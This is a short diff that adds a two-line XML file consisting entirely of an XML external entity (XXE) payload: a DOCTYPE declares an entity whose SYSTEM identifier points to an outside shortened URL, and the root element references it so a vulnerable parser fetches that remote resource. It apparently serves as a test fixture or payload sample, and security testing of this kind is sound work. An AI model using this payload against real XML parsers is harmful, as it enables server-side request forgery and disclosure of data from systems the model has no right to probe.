@@ -1,0 +1,2 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://bit.ly/2TKp8Ng/">]><foo>&xxe;</foo>
